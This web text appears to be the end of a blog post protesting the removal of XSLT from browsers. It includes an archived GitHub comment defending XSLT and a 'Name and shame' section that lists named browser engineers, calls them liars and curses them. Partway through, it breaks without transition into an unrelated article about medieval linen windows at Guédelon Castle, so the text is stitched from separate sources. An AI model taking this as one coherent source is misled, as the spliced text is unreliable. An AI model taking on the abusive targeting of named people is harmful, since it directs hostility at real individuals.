<p>Although the benefits of XML and the transformative power of XSLT mostly caught the attention of professionals in a variety of fields,
at the turn of the century their flexibility reached also into the more general population of web users
through the specific incarnation of <a href="http://en.wikipedia.org/wiki/RSS">RSS</a> and <a href="http://en.wikipedia.org/wiki/Atom%20%28web%20standard%29">Atom</a> <a href="http://en.wikipedia.org/wiki/web%20feeds">web feeds</a>,
which allowed users to remain informed about news and updates on their favorite websites
without constantly “making the rounds”.</p>

<p>RSS and other XML-based technologies such as <a href="http://en.wikipedia.org/wiki/Pingback">Pingback</a>s
were the backbone of <a href="http://en.wikipedia.org/wiki/blogging">blogging</a>,
the distributed social network that characterized the first decade of the XXI century.</p>

<p>With blogging common and <em>distributed</em> across multiple platforms,
the possibility to <em>aggregate</em> information from disparate sources,
and still see it presented as a regular web page, across browsers,
without any need for scripting,
in a time where implementations were slow and
(thanks to Microsoft, intentionally) <a href="https://en.wikipedia.org/wiki/JavaScript#History">incompatible with each other</a>,
was seen as a clear win.</p>

<p>Despite the efforts by Google to kill it since 2013,
the RSS format remains an essential component of an open and independent web,
still in widespread usage both server and client side:
there's an estimate 500+ million websites using <a href="http://en.wikipedia.org/wiki/WordPress">WordPress</a>,
and they <em>all</em> feature RSS feeds, even when not properly advertised;
most if not all <a href="http://en.wikipedia.org/wiki/Fediverse">Fediverse</a> platforms also offer RSS feeds,
and some (e.g. <a href="http://en.wikipedia.org/wiki/Friendica">Friendica</a>) can also import them and thus work as aggregators;
and possibly most important, RSS are <em>the</em> fundamental component of <a href="http://en.wikipedia.org/wiki/podcast">podcast</a>s
(«<a href="https://www.thepodcasthost.com/business-of-podcasting/podcasts-need-an-rss/">it's not a podcast if it's not RSS</a>»),
a multimedia distribution format with hundreds of millions if not billions of users worldwide.</p>

<p>As already mentioned, <a href="https://www.citationneeded.news/curate-with-rss/">it's now seeing a resurgence</a>
as people have started realizing how catastrophic for the web was the centralization
driven by <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> during the second decade of the XXI century
(even though too many have failed to learn the correct lesson,
and have just jumped from <a href="https://web.archive.org/web/20221221103518/https://god.dailydot.com/bartender-kicks-out-tweets/">one Nazi bar</a> <a href="https://www.techdirt.com/2025/08/04/substacks-algorithm-accidentally-reveals-what-we-already-knew-its-the-nazi-bar-now/">to the next</a>,
or have fallen for <a href="https://wok.oblomov.eu/tecnologia/credible-threat-2/">the cosplay of federation</a>
because it's shinier than <a href="https://wok.oblomov.eu/tecnologia/credible-threat-3/">actual federation</a>).</p>

<p>XSLT is an <em>essential</em> companion to RSS, as it allows the feed itself to be perused in the browser
(unless, of course, the browser makes the extra effort to prevents you from visualizing it at all, like Firefox does).
This allows sites with hundreds of feeds to use <em>the feed itself</em> (styled with XSLT) as index page,
reducing hosting and bandwidth costs.
And of course it can also be used to style any other “standard” XML document that may be found on a site:
for example, <a href="https://mastodon.social/@aslakr/115015511759324306">I have recently discovered</a>
thanks to <a href="https://mastodon.social/@aslakr">@aslakr​@mastodon.social</a>,
that WordPress provides a default XSLT stylesheet for its sitemaps
(curiously, apparently not one for its web feeds, though?)</p>

<p>And that's just the beginning: <a href="https://wok.oblomov.eu/tecnologia/sparkling-wok-4/">as I've shown on this same site</a>,
it's possible to use XSLT <a href="https://wok.oblomov.eu/tecnologia/plotting-xslt/">to plot XML data</a>,
and in general to produce rich, complex documents <em>without JavaScript</em>,
and again with potentially significant reductions in hosting and bandwidth costs.</p>

<p>Bonus points: <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3161446202">it seems</a> that the horde of LLM scrapers that are causing troubles all around
have some difficulties with general XML, so switching to XML+XSLT could actually work for self-protection.</p>

<p>Remember <a href="#amp">AMP</a>?
If you really wanted to keep shipping the usual tons of useless crap on desktop, but not on mobile,
you could put the actual content in an XML file,
and then provide two separate, trivial XSLT stylesheets,
one to transform it into the usual bloated desktop page,
and one to transform it into the stripped-down (and less bloated) abomination that is AMP HTML
—which would have come in handy when Google introduced the requirement that the AMP and standard page
had to present the same content.
But then again, why even ship those tons of useless crap on desktop in the first place?</p>

<p>And to be honest, <a href="https://web.dev/articles/webcomponents-template" title="HTML's New Template Tag">HTML templates</a> look thoroughly unimpressive compared to XSLT.</p>

<h3 id="dorian"><a name="index1h3"></a>Dorian Taylor on XSLT</h3>

<p>If you've read this far, I would encourage you to also read
<a href="https://github.com/whatwg/html/issues/11523#issuecomment-3160242434">the passionate defense of XSLT by Dorian Taylor</a>
on the Github issues that Google is using as an excuse to kill the standard.
In case GAFAM gets touchy and decides to purge it,
I'm taking the liberty to reproduce it here for archival purposes:</p>

<blockquote>
  <p>I have been using XSLT since it was in beta and the only browser that implemented it was MSIE 5.5.
  I designed and implemented an internationalized content pipeline using XSLT and DocBook at the job I had from 2002-2005.
  Since about 2007 I've been using XSLT regularly on the client side to transform (X)HTML into itself (as well as SVG and Atom),
  because it excels at bolting presentation markup onto plain semantic markup,
  and thus makes for an extremely lazy templating language that exists separately from the JavaScript ecosystem.
  I use it on <a href="https://doriantaylor.com/">my own</a> <a href="https://the.natureof.software/">Web properties</a>,
  and I use it on projects (I mainly do intranets).
  I have made libraries <a href="https://github.com/doriantaylor/xslt-transclusion">for seamless transclusion</a>
  and <a href="https://github.com/doriantaylor/xslt-rdfa">querying RDFa</a>, and I use those on projects
  (like <a href="https://senseatlas.net/">Sense Atlas</a>, a nascent
  knowledge graph product I'm working on, and <a href="https://intertwingler.net/">Intertwingler</a>, the application
  server that powers it).</p>
  
  <p>Why I still use XSLT:</p>
  
  <ul>
  <li>it's a standard</li>
  <li>it's fast (at least nominally)</li>
  <li>it's declarative</li>
  <li>it's orthogonal to JS</li>
  <li>it can mix any number of back-ends (because it's a standard and operates over standard inputs;
  I regularly use it to mix static and dynamic resources on the same page)</li>
  <li>it can only operate over information you give it (modulo zero-days, apparently)</li>
  <li>it operates over wholes, i.e., it doesn't stitch together markup as text but rather operates over intact DOM structures.</li>
  </ul>
  
  <p>The first and last points are probably the biggest reasons I still use it, and I suppose the latter may need some unpacking.
  An XSLT stylesheet is a well-formed XML document and only operates over well-formed XML documents,
  and (unless you put in the effort) is only capable of producing well-formed (X|HT)ML documents.
  So you have a validity check baked in at a very low level.
  Every other templating language I've seen, going all the way back to server-side includes (<a href="http://clearsilver.net/">with one esoteric exception</a>),
  seems to not be shy about chopping up the syntax of the target language.</p>
  
  <p>I anticipate the knee-jerk reaction to this is "so what?".
  Why should you care whether your template language breaks the syntax of the target?
  The tooling can compensate and it's intact when you render it. I mean, I guess?
  But then you need more tooling when otherwise an off-the-shelf validator would do.
  But that I think is not even the main differentiator.</p>
  
  <p>The key difference, and why I've stuck with XSLT for almost 25 years, is cognitive.
  When I make a hypermedia resource (I am deliberately not using the word "page"),
  I think about it as a discrete, atomic whole.
  I can consider that object (and the server-side code that generates it) in isolation.
  It loads in the browser and is well-formed and intact and navigable.
  Then I can think about applying transformations to that object,
  and/or composing related objects together, as a separate act.
  When I write an XSLT template, I think about it like a function (in the mathematical sense) rather than a procedure.
  I see my job as not to stitch together fragments of markup but to describe the node tree that results from an input tree.
  When I look at so-called "modern" frameworks, I (still) don't see any of that.</p>
  
  <p>The reason why the implementations are riddled with CVEs, in my opinion, is because of neglect.
  I am old enough to remember when HTML5 was competing with XHTML2✱ as the proposed next-generation HTML standard.
  It turned out that the pedantry of the XML parser was not only reviled by developers
  (and remains a source of confusion for users if they hit a bad patch of it),
  for markup it was actually unnecessary.
  Tastes changed, and people moved on.
  The browser vendors keep the parsers around, but they demonstrably put as little effort into them as they can get away with.
  (The biggest shortcomings of XSLT 1.0 were fixed in 2.0—in 2007—but of course the browsers never implemented it.)</p>
  
  <blockquote>
    <p>✱ XHTML2 actually had some really good ideas (like transclude all the things),
    but its mission (something like "how do we make the best XML-based hypertext markup language") was ultimately wrong-headed.
    I am also old enough to remember, however, that one of the central arguments for HTML5
    (now just "HTML", of course) was not breaking backward-compatibility.</p>
  </blockquote>
  
  <p>My proposal, then, is not to scrap XSLT, but to rehabilitate it.
  When it first shipped, XSLT was a solid, open-standard solution to the bog-standard problem of generating presentation markup.
  How many times has the wheel of Web templating been reinvented for this framework or that?
  Where is the Open Web successor to XSLT? How about…XSLT?</p>
  
  <p>At its core, XSLT is terrifically powerful, especially <a href="https://www.w3.org/TR/xslt-30/">its latest incarnation</a>
  (which, incidentally, <a href="https://www.w3.org/TR/xslt-30/#json">can operate over JSON</a>). There are, of course, challenges:</p>
  
  <ol>
  <li>I would say problem number one is the syntax. XSLT is an extremely bulky, chatty language.
  Without syntax completion in your code editor you'd never get anything done.
  But, there are precedents for ameliorating this,
  like <a href="https://relaxng.org/compact-tutorial-20030326.html">the compact syntax for RelaxNG</a>,
  or the <a href="https://www.w3.org/TR/turtle/">Turtle</a> or <a href="https://www.w3.org/TR/json-ld11/">JSON-LD</a> syntaxes for RDF.</li>
  <li>XSLT only operates over XML (except of course for 3.0 which made an accommodation for JSON).
  Well that's simple, bump XSLT to 3.1 and spec out how it should operate over HTML DOMs (case-insensitive tags, whatever),
  as well as an invocation hook analogous to the XSLT processing instruction.</li>
  <li>Namespaces: Apparently people hate them?
  This is something I have never understood (because if you don't use namespaces you just end up reinventing them badly), but whatever, fine.
  You won't need namespaces in your XPath anyway if you're just transforming HTML.</li>
  <li>XPath: I would actually put money on the likelihood that CSS selector semantics can embed fully into XPath,
  especially given that XPath 3.1 itself is extensible (worst case scenario is you cheat and just make a <code>css</code> function).</li>
  <li>Debugging: currently sucks. This I would chalk up to the same neglect as the CVEs.</li>
  </ol>
  
  <p>It would be eminently feasible to make a "<em>SWeT</em>", Standard Web Templates:</p>
  
  <ul>
  <li>easy, neat, declarative syntax, comparable to Sass or RNC (<a href="https://doriantaylor.com/file/xslt-mockup">I sketched one out in like 2019</a>)</li>
  <li>isomorphic (or at least injective onto) XSLT 3.0 (3.1?); compiles to it</li>
  <li>wouldn't have to touch namespaces or even XPath if you didn't want to (use CSS selectors instead)</li>
  <li>still capable of existing outside of the JS ecosystem, but can be accessed from JS/DOM just like XSLT 1.0 can</li>
  </ul>
  
  <p>Now I can imagine somebody saying well I can go off and do that anyway;
  <a href="https://www.saxonica.com/saxonjs/index.xml">there's a reference implementation</a> of XSLT 3.0 I can compile against (written, actually, by the spec's author), etc etc. I think
  that kind of misses the point of having a <em>standard</em> templating language that you can rely on being baked into every Web browser.
  At least, I suppose, until they rip it out.</p>
  
  <p>So I guess my ultimate question is, is there truly no appetite for a standard language for transforming markup,
  a thing we all have to do, on every project, all the time?
  A thing that for lack of a standard, locks us into this or that framework,
  or stymies <a href="https://doriantaylor.com/intelligent-heterogeneity">casual system heterogeneity</a>?
  A thing that would make it even easier to build the Web? Seems like a sensible idea, doesn't it?</p>
</blockquote>

<p>(Again: <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3160242434">source, for reference</a>.)</p>

<p>And now, onwards to what's ahead.</p>

<h2 id="whatwecandoaboutit"><a name="index4h2"></a>What we can do about it</h2>

<h3 id="makeyourselfbeseen"><a name="index2h3"></a>Make yourself be seen</h3>

<p>The first step is to actually use XML and XSLT. Visit sites that use them.
If you have your own website, seek out opportunities to rely on this tech.
If you don't know how, there's <a href="https://github.com/whatwg/html/issues/11523#issuecomment-3161446202">apparently</a> a growing number of tutorials around,
both in text and video form. Stealing the links to the text tutorials from the above link,
we have for example.</p>

<ul>
<li><a href="https://ricardolopes.net/blog/styling-rss/">Styling Your RSS For a Better Web</a></li>
<li><a href="https://hacdias.com/2024/10/23/styled-rss-feeds/">Styling My RSS Feed</a></li>
<li><a href="https://dev.to/natclark/styling-an-rss-feed-with-xslt-jp3">Styling an RSS Feed With XSLT</a></li>
<li><a href="https://darekkay.com/blog/rss-styling/">Style your RSS feed</a></li>
</ul>

<p>(notice a pattern there?)</p>

<p>And styling RSS is just the most common use-case of XSLT.
You can use it to <a href="https://wok.oblomov.eu/tecnologia/plotting-xslt/">plot data</a> and <a href="https://wok.oblomov.eu/tecnologia/plotting-sparklines-xslt/">create sparklines</a>,
like I've done.
You can use it <a href="https://wok.oblomov.eu/tecnologia/uberprufungslisten/">in place of server-side includes</a>.
You can use it to render tabular data you have in XML form.
You can use it <a href="https://gts.skobk.in/@tennoseremel/statuses/01K317WWPS020K8XYSNNCSWHM3">to adjust the (X)HTML structure of your documents</a>
to <a href="https://wok.oblomov.eu/tecnologia/web/css-challenges/">compensate for CSS limitations</a>.</p>

<p>By the way, if you can find new and interesting applications of XSLT in browsers, do let me (and the world) know
(see bottom of this article for information about how to contact me on the Fediverse).</p>

<h3 id="makeyourselfbeheard"><a name="index3h3"></a>Make yourself be heard</h3>

<p>Complain. Complain. Complain.
Comment on every relevant issue. Vote against the issue in the issue trackers.
Let the browser developers know you are affected.</p>

<p>If (or when) the changes still pass, open new tickets.
<em>Demand</em> that XSLT support be reinstated. And while you're at it, <em>demand</em> that it get upgraded to XSLT 3.0 at least.
And <em>demand</em> that it be enabled for plain HTML.</p>

<p>Voice your opinion on social media. Post about it. Tag the social media profiles of the WHATWG,
of  Google, Apple, Mozilla, Microsoft,
of Chrome, Safari, Firefox, Edge, and let them know that such a change will not be accepted.</p>

<p>Do not let the lies prevail.
The choice to suppress XSLT is not due to technical reasons, and it's not due to lack of resources.
It's entirely a policy choice intended to obstruct and limit the expressivity of the open and indie web,
and this needs to be remarked to anyone believing otherwise.</p>

<h3 id="buildthealternative"><a name="index4h3"></a>Build the alternative</h3>

<p>If (or when) the changes pass, our best option is to push through with a polyfill like the <a href="https://www.saxonica.com/saxonjs/index.xml">SaxonJS</a>
<span>mentioned by Dorian Taylor|</span>.
It will not be as efficient as a native implementation, it will not be as fast,
andit will not be enough to allow clients to open and visualize XML files directly,
but it <em>will</em> allow us to build the case for a return to XSLT as a significant web technology,
and become an important instrument in pressuring vendors for new native implementations,
not unlike how <a href="http://en.wikipedia.org/wiki/MathJax">MathJax</a> has been a useful bridge to native implementations of <a href="http://en.wikipedia.org/wiki/MathML">MathML</a>.</p>

<p>For pure XML files&nbsp;… maybe an <a name="extensions">extension</a>? This is most likely possible for Firefox,
but I don't know enough about the <a href="#mv3">more restrictive rules implemented in Chrome</a> to tell if it would be possible or not.
But of course, even if such an extension was possible today,
there is no guarantee that Chrome won't push for <em>another</em> change in the API
to disable it, like it did with ad&nbsp;blockers.</p>

<p>Who knows, it might as well be that the <a href="http://en.wikipedia.org/wiki/Streisand%20effect">Streisand effect</a> on this umpteenth attempt by Google to kill XSLT
will be the chance for its rebirth.</p>

<h2 id="afterword"><a name="index5h2"></a>Afterword</h2>

<p>With as much I hate Microsoft, its anticompetitive practices,
and the way their Wintel monopoly has stymied software and hardware development,
killed companies and destroyed innovation in the desktop and workstation space,
<em>one</em> thing I can say about the <a href="http://en.wikipedia.org/wiki/First%20browser%20war">First browser war</a> is that
—at least while it was ongoing— it led to a lot of innovation in the web space.
Microsoft were the first to implement client-side XSLT,
they were the ones that opened the gateway to <a href="http://en.wikipedia.org/wiki/AJAX">AJAX</a>
through their proprietary XMLHTTP <a href="http://en.wikipedia.org/wiki/ActiveX">ActiveX</a> control that
was reimplemented into other browsers as the <a href="http://en.wikipedia.org/wiki/XMLHttpRequest">XMLHttpRequest</a> object,
and they were the ones that tried to add SMIL to (X)HTML through the <a href="http://en.wikipedia.org/wiki/HTML%2BTIME">TIME</a> extension,
which I wish hadn't failed the way it did
(we would have to wait nearly another decade before a limited subset of the functionality would finally get into HTML via <a href="http://en.wikipedia.org/wiki/CSS%20animations">CSS animations</a>).</p>

<p>It's possible that this is was at least in part due to the fact that,
as it has been said, Microsoft didn't “get” the Internet,
but I suspect that the primary reason was that there was some actual competition going on
—competition that since the creation of the WHATWG has been replaced by what is,
for all intents and purposes, a <em>cartel</em>.</p>

<p>The intent to bypass the W3C for some decisions <em>did</em> have some merit at the time of creation;
looking at the <a href="https://www.w3.org/2004/04/webapps-cdf-ws/papers/opera.html" title="Position Paper for the W3C Workshop on Web Applications and Compound Documents">the document</a> whose rejection led to the creation of the WHATWG,
for example, we see among the design principles:</p>

<blockquote>
<dl>
<dt>Well-defined error handling</dt>
<dd>Error handling in Web applications must be defined to a level of detail where User Agents do not have to invent their own error handling mechanisms
or reverse engineer other User Agents'.</dd>
<dt>Users should not be exposed to authoring errors</dt>
<dd>Specifications must specify exact error recovery behaviour for each possible error scenario.
Error handling should for the most part be defined in terms of graceful error recovery (as in CSS),
rather than obvious and catastrophic failure (as in XML).</dd>
</dl>
</blockquote>

<p>which I can't disagree with.
On the other hand,
it's also clear that two other design principles,
<em>backwards compatibility</em> and <em>open process</em>,
have been consistently violated since
<a href="https://wok.oblomov.eu/tecnologia/opera-requiem-2/">Opera dropped out</a>
(oh, how prescient I was in that article!)
and the WHATWG was taken over by Google and its lapdogs (Mozilla)
and frenemies (Microsoft and Apple).</p>

<p>Today, I'm left wondering if the developers of browsers like
<a href="http://en.wikipedia.org/wiki/Servo%20%28software%29">Servo</a>
—<a href="https://servo.org/">the engine</a> born out of the Mozilla experiments
that were cut out (with the entire development team fired)
at the start of the <a href="http://en.wikipedia.org/wiki/COVID%2D19%20pandemic">COVID-19 pandemic</a>—
or
<a href="http://en.wikipedia.org/wiki/Pale%20Moon">Pale Moon</a> would even be accepted into the WHATWG today,
since they could
(and <a href="https://outerheaven.club/objects/ce85bc54-449d-43a6-8bea-022cdbb2b457">at the least the latter would</a>)
happily throw a wrench into the whole
“fake public feedback” mockery we've been subject to this time.</p>

<h2 id="nameandshame"><a name="index6h2"></a>Name and shame</h2>

<p>The engineers working on these proposals should be ashamed of themselves.
The names I could gather from the public discussions are:</p>

<ul>
<li>Adam Barth was
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/zIg2KC7PyH0/m/Ho1tm5mo7qAJ">the engineer who proposed to remove XSLT in 2013</a>,
with support from Eric Seidel, Ojan Vafai;</li>
<li>Philip Rogers and Eric Willigers were
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/5o0yiO440LM/m/59rZqirUQNwJ">the engineers who proposed to remove SMIL in 2015</a>,
with support from Chris Harrelson, Dimitri Glazkov, Philip Jägenstedt;</li>
<li>Ryan Sleevi was
<a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/pX5NbX0Xack/m/kmHsyMGJZAMJ">the engineer who proposed to remove <code>keygen</code> in 2015</a>;</li>
<li>Ben Wiser, Borbala Benko, Philipp Pfeiffenberger, Sergey Kataev were
<a href="https://github.com/explainers-by-googlers/Web-Environment-Integrity/blob/main/explainer.md">the engineers who proposed the Web Environment Integrity</a>;</li>
<li>Mason Freed is
<a href="https://github.com/whatwg/html/issues/11523">the engineer pushing the XSLT removal in 2025</a>,
with support from Anne van Kesteren,
the Mozilla employee that appropriately goes by the moniker <code>smaug</code>,
Tab Atkins Jr., Domenic Denicola.</li>
</ul>

<p>If you ever hear any of these blabber about open web, interoperability and standards,
know that they are lying through their teeth.</p>

<p>And if any of you happen to read this: fuck you.</p>

<h2 id="madethenews"><a name="index7h2"></a>Made the news</h2>

<p>I've apparently “made the news”.</p>

<ul>
<li><p><a href="https://www.osnews.com/">OSNews</a> has <a href="https://www.osnews.com/story/143123/google-is-killing-the-open-web/">an article</a> that provides a very nice, short, on-point summary;</p></li>
<li><p><a href="https://news.ycombinator.com/">Hacker News</a> has <a href="https://news.ycombinator.com/item?id=44949857">a thread</a>.</p></li>
</ul>

<p>I have read the comments
(yes, I know, you should never do that)
and it's curious that those that didn't like or agree with the article can be grouped in three sets:</p>

<dl>
<dt>unconvinced by my timeline</dt>
<dd>these are commenters that disagree on my list being enough to prove that Google is out to destroy the open web;
that's OK, the list isn't there to prove anything, it's just to remind people
(or inform youngsters who might not remember those days)
about some relevant (and a couple less relevant) events in the last decade-plus that have significantly shaped the web;
the list isn't even exaustive insofar Google is concerned,
let alone all the crap, failed promises, rug pulls and abuses committed by the rest of the <a href="http://en.wikipedia.org/wiki/GAFAM">GAFAM</a> crowd
—the only reason I'm singling out Google here, and on those events in particular, is because the focus is on XML, XSLT,
and the WHATWG takeover and unwillingness to listen to what users have to say;</dd>
<dt>disagreement on the assessment</dt>
<dd>these are people who disagree on some of the events I reported being bad for the open web,
or aimed at encircling it; so far, from what I see, these comments come from Googlers or ex-Googlers;
well, I'm sorry to burst your bubble; I'm sure the engineers working at Google
have always had the conviction to be doing Good Stuff™ for the benefits of all;
but see, that's kind of the problem of a lot of Big Tech employees:
the lack of attention to the <em>implications</em> of what their brilliant ideas are going to be used for
—and sometimes, possibly, even the time to stop and think if the “innovation”
is even needed in the first place, or you're forgetting what older, well-established but less reknown tech can already do;</dd>
<dt>people that don't like XML</dt>
<dd><strong>you're missing the point</strong>; this isn't about whether XML is nice or not,
it's about the fact that it exists, it's in use, and it's a powerful tool that web developers can and <em>do</em> use;
you prefer <a href="https://wok.oblomov.eu/tag/JSON/" rel="tag">JSON</a> to <a href="https://wok.oblomov.eu/tag/XML/" rel="tag">XML</a>? <em>That's fine</em>, and if anything that's one more reason to push
browser developers to implement newer XSLT versions that <em><a href="https://www.w3.org/TR/xpath-31/">support JSON too</a></em>;
or if you prefer: the question isn't whether or not XML and XSLT are worth saving;
<strong>it's whether or not you want Google to define what is allowed on the World Wide Web</strong>.
</dd>

<p><strong>Sometimes it takes a village</strong> to raise a window. Between 2015 and 2017, skilled masons meticulously carved and beveled arches and four-lobed flourishes for a Gothic-style stone window frame in Guédelon Castle’s ornate Chapel Tower. All that remained was to install some glass. But there was a problem, and the carpenters, painters, blacksmiths, basket weavers, historians, and archaeologists who work on-site were all enlisted to figure it out. Eight years later, the matter of what to put in the window of a medieval castle has nearly been resolved…maybe.</p>



<p>Luckily, the team of 40 professional builders and craftspeople at Guédelon Castle love a conundrum. The castle, located in an abandoned quarry in the Puisaye region of Burgundy, 100 miles southeast of Paris, is the site of one of the world’s most comprehensive and longest-running experimental archaeology projects. In this kind of undertaking, archaeologists partner with skilled laborers to test hypotheses about how people worked, lived, and built in the past, filling gaps in academic knowledge through real-world trials. The project launched in 1998 with a straightforward mandate: Build a thirteenth-century castle using only thirteenth-century tools, techniques, and materials. Medieval archaeologists would provide guidance. And the hope was that every obstacle would reveal something that historians, architectural researchers, archaeologists, and <em>castellologues</em>, or scholars who specialize in studying castles, didn’t know. “At Guédelon, we’re looking for what disappeared in traditional archaeology,” says Florian Renucci, the master mason and longtime site director at Guédelon, who was formerly a researcher at Sorbonne University. “Experimental archaeology means bringing to life what workers can do. We’re always looking, hearing, feeling. Now, with our work, the castle can speak.”</p>

After several decades, masonry work on the castle’s Chapel Tower (top left) and the adjoining Great Hall is now complete.</figcaption></figure>



<p>The first thing the castle said about windows is that they couldn’t have been made of glass. Guédelon’s artisans and committee of scientific advisers are constantly scouring medieval texts for clues about how thirteenth-century builders would have handled such details. In the castle’s imagined backstory, the fictitious seigneur, or lord, of Guédelon was a cash-conscious minor noble trying to make a home in 1228, putting him—and today’s builders of Guédelon—at the mercy of his financial circumstances. In that era, glass was extraordinarily expensive and reserved for places of worship and royal residences. Glasswork, the team learned, swallowed up half the cost of building a cathedral. Unfortunately, whatever material was used to fill the window frames of lesser edifices has left no traces in the archaeological record.</p>



<p>Artisans, many wearing period garb, initially tried to fashion goatskin panels for the Chapel Tower window after learning that this material had been used in contemporaneous buildings—but the panels warped in the winter frost and cracked in the summer heat. The team then reviewed a list of prices for the materials used to build the Palais des Papes, or Palace of Popes, in Avignon, which was begun in 1252. They learned that humble linen, stiffened with beeswax, once covered some windows at this grandest of châteaus. Valérie Lachény, Guédelon’s master painter, decorated linen canvases with an eye-catching design of golden oak leaves ensconced in maroon semicircles—a pattern inspired by twelfth-century stained glass at Strasbourg Cathedral in northeastern France. In spring 2025, three painted linen panels could be found propped in her workshop, each waiting to be affixed between wooden frames engineered by the castle’s carpentry atelier to fit into the tower’s stone window molds. Each frame takes 150 hours to join, rasp, carve, and assemble.</p>


<figure data-wp-context="{&quot;imageId&quot;:&quot;68a4572ccdd5a&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="306" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-1024x306.jpg" alt="" data-image-credit="Ben O’Donnell; © Ralph Hammann/Wikimedia Commons; Ben O’Donnell" srcset="https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-1024x306.jpg 1024w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-300x90.jpg 300w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo-768x229.jpg 768w, https://archaeology.org/wp-content/uploads/2025/07/SO25-France-Guedelon-Strasbourg-Windows-Combo.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Decorated linen window panels (left) stand in the Guédelon painters’ atelier, awaiting installation in the Chapel Tower. Patterns from twelfth-century stained glass at Strasbourg Cathedral (middle) inspired the panels’ designs. One linen panel (right) in the Great Hall’s antechamber has already been put in place.</figcaption></figure>



<p>Meanwhile, an ongoing debate about how to fasten the linen to the frames rages. Guédelon’s blacksmiths have forged bespoke iron tacks, but, as carpenter Simon Malier explains, this option for attaching the fabric requires finesse, lest the wood crack. The basket weavers have suggested sewing the linen into the frames with a cow-horn needle. “For this kind of thing,” Malier says, “it’s a team effort.” Whatever method wins out, when the window is finally mounted, the waxed linen exterior will be brushed with flaxseed oil to protect it—which may or may not work. Recently, Malier says that he, Renucci, and Lachény stumbled on a snippet of medieval text describing a tantalizing linen window coating that shines “like crystal.” “But we don’t have the bloody recipe!” he laments.</p>



<p>“Because the Guédelon team works in the conditions of thirteenth-century laborers, they discover techniques that people were figuring out at that time,” says archaeologist and Guédelon project scientific committee member Nicolas Faucherre of Aix-Marseille University. “That’s why Guédelon is so important for archaeologists.” Every detail must be considered, and there are no shortcuts. The site is an unparalleled experimental archaeology project and may remain never-quite-finished forever. By observing the work of the castle’s “medieval” builders, archaeologists and other scholars have discarded old ideas and hatched new ones about how monuments of the era were created. They have solved mysteries about how ceramic for tiles was mixed and fired, how lime mortar was troweled to hold structures fast and make them last, and how scaffolding was erected to reach dizzying heights. Some discoveries may seem esoteric, but each one can help refine scholars’ understanding of tens—or even thousands—of medieval sites.</p>

<p><strong>In 1995</strong>, Faucherre and archaeologist Christian Corvisier found something quite striking while studying Saint-Fargeau Castle, 5.5 miles northwest of Guédelon. The château there was built from the fifteenth through the seventeenth century, but the archaeologists discerned the foundations of a smaller, earlier fortification with thirteenth-century characteristics beneath it. The château’s owner, Michel Guyot, became intrigued by the prospect of rebuilding the earlier structure. So, he bought the disused quarry in Guédelon Forest in the commune of Treigny and embarked on the adventure with cofounder Maryline Martin, a young businessperson. Instead of imitating Saint-Fargeau Castle, they decided, the new structure would be an original, loosely following the model of Ratilly Castle, which had been built around 1270 just two miles south.</p>



<p>“When I came here for the first time, it was just forest,” says Martin, who is now the owner of Guédelon. “But we had a lot of luck.” The forest, 370 acres of which belong to Guédelon, has ample oak for timber, a lode of iron-streaked sandstone that serves most of the masons’ and blacksmiths’ needs, and seemingly bottomless pockets of colorful minerals for the painters to extract pigments from. “It’s incredible for me to imagine how many solutions we have just within sight,” Martin says.</p>

<p>The first years at Guédelon were strenuous and invigorating, long days testified in chisel marks on stone, ax splits on timber, and strokes on sketch pads. It took three years to build the 11.5-foot-thick foundation walls, which trace a perimeter of 660 feet. Many of the original laborers were unemployed, some with past legal difficulties, and had been left behind in a place where most factories and quarries had shuttered, and even the railroad had ceased running long before. As Martin recalls, quarriers would etch their encouragement on blocks passed to the masons. “Only ten to go! Only nine to go!” read inscriptions on some stones. In 1998, the construction site opened to curious visitors, and 300,000 now come each year, 60,000 of whom are schoolchildren. The castle, and everything else Guédelon includes, encompasses a self-sustaining business, funded by ticket sales, an on-site restaurant, and a gift shop.</p>



<p>Amid innumerable false starts and experiments gone awry, Guédelon Castle began to rise. Between 2000 and 2017, Renucci and his team executed four different styles of medieval ceiling vault—mostly to see if they could—all without any ahistorical reinforcement from iron or concrete. By 2010, the carpenters had lifted magnificent timber trusses over the castle’s Great Hall and living quarters, and soon Guédelon’s grounds included gardens, stables, a water mill, and 10 workshops.</p>

<p><strong>The Puisaye skies</strong> threaten rain, as they often do in April, but excitement is in the air. Guédelon opened for the season just a few weeks ago. Stonemasons have completed two of the castle’s four corner towers using the area’s brilliant burnt-orange sandstone. The table is set in the Great Hall under a lofty oak-timber barrel vault. Painters have adorned the hall’s antechamber with willowy vines and cheery flowers dancing around stone blocks. The carpenters have even mounted a linen window there—it seems to be faring well thus far. Beyond the castle walls, a blond-maned horse makes light work of pulling an empty cart, and kids stop to gawk at the “squirrel cage,” a leviathan treadmill winch atop the south curtain wall. Inside this human hamster wheel, masons trudge in pairs to power a pulley that lifts blocks and mortar up to the parapet they’re finishing.</p>



<p>Renucci is at the castle this morning as usual, but there’s no such thing as an ordinary day for the master mason. He has to sketch and resketch all plans by hand, troubleshoot glitches with archaeologists around the country, convene weekly meetings of artisans to hear their latest updates and bon mots, and oversee all construction and craft operations. Renucci, who helped restore Paris’ iconic sixteenth-century bridge, the Pont Neuf, first donned a period-appropriate tunic and capelet for his role at Guédelon in 1998. Today, the clanking of the quarriers and the whoosh of the forge bellows tell him the morning has begun smoothly, so he’ll take a lap around the castle to check on progress.</p>

